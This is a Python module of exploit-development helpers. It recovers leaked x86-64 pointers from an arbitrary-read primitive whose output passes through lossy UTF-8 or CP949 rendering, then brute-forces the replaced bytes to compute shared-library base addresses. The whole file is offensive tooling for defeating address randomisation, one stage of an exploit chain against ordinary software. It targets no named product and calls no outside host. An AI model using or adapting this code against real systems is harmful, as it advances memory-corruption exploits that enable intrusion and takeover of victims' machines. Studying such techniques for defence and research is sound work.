"""Helpers for arbitrary-read sinks that decode raw bytes as UTF-8/replace.

The local integration fixture uses lossless hexadecimal output.  These helpers
preserve the candidate-recovery method needed when an application renders the
forged string through a lossy UTF-8 layer instead.
"""
from __future__ import annotations

import itertools


class LossModelError(ValueError):
    pass


def transformed(raw: bytes) -> bytes:
    """Return raw bytes after UTF-8 decoding with replacement and re-encoding."""
    return raw.decode("utf-8", "replace").encode("utf-8")


def reconstruct_cp949(cell: bytes) -> tuple[bytes, bytes, int]:
    """Recover known CP949 bytes and mark each U+FFFD byte as unknown."""
    recovered = bytearray()
    mask = bytearray()
    replacements = 0
    for character in cell.decode("utf-8", "replace"):
        if character == "\ufffd":
            recovered.append(0)
            mask.append(0)
            replacements += 1
            continue
        try:
            encoded = character.encode("cp949")
        except UnicodeEncodeError:
            recovered.append(0)
            mask.append(0)
            continue
        recovered.extend(encoded)
        mask.extend(b"\x01" * len(encoded))
    return bytes(recovered), bytes(mask), replacements


def raw_pointer_values(cell: bytes, *, max_unknowns: int = 2) -> list[int]:
    """Enumerate canonical x86-64 pointers represented by a lossy cell."""
    pieces: list[bytes | None] = [
        None if character == "\ufffd" else character.encode("utf-8")
        for character in cell.decode("utf-8", "strict")
    ]
    unknowns = sum(piece is None for piece in pieces)
    known_length = sum(len(piece) for piece in pieces if piece is not None)
    if known_length + unknowns != 8 or unknowns > max_unknowns:
        raise LossModelError(
            f"pointer loss is not bounded: known={known_length} replacements={unknowns}"
        )
    found: set[int] = set()
    for replacements in itertools.product(range(256), repeat=unknowns):
        iterator = iter(replacements)
        raw = b"".join(bytes((next(iterator),)) if piece is None else piece for piece in pieces)
        if transformed(raw) != cell:
            continue
        pointer = int.from_bytes(raw, "little")
        if 0x00007F0000000000 <= pointer <= 0x00007FFFFFFFFFFF:
            found.add(pointer)
    return sorted(found)


def pointer_base_candidates(cell: bytes, *, symbol_offset: int) -> list[int]:
    """Return page-aligned DSO bases for a lossy symbol-pointer cell."""
    return sorted(
        {
            pointer - symbol_offset
            for pointer in raw_pointer_values(cell)
            if pointer >= symbol_offset and (pointer - symbol_offset) % 0x1000 == 0
        }
    )


def broad_page_base_candidates(
    cell: bytes, *, symbol_offset: int, ceiling: int = 4096
) -> list[int]:
    """Enumerate page bases when U+FFFD may have consumed multiple raw bytes."""
    text = cell.decode("utf-8", "strict")
    if len(text) < 4 or any(ord(character) > 0x7F for character in text[-4:]):
        raise LossModelError("lossy pointer has no literal canonical high dword")
    high_raw = b"".join(character.encode("ascii") for character in text[-4:])
    high = int.from_bytes(high_raw, "little") << 32
    if not 0x00007F0000000000 <= high <= 0x00007FFF00000000:
        raise LossModelError("lossy pointer high dword is outside the canonical DSO range")
    found: list[int] = []
    for low in range(0, 1 << 32, 0x1000):
        base = high | low
        pointer = base + symbol_offset
        if transformed(pointer.to_bytes(8, "little")) != cell:
            continue
        found.append(base)
        if len(found) > ceiling:
            raise LossModelError(f"candidate ceiling exceeded ({ceiling})")
    return found
